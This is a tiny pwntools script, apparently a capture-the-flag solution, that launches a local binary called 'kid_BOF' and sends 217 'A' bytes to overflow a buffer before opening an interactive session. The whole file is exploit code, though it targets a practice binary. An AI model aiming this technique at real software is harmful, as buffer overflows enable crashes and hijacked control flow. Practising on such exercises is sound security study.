from pwn import *

# setup process
p = process("./kid_BOF")
context.binary = "./kid_BOF"

# payload 
payload = b'A' * 217

# send payload
p.sendline(payload)
p.interactive()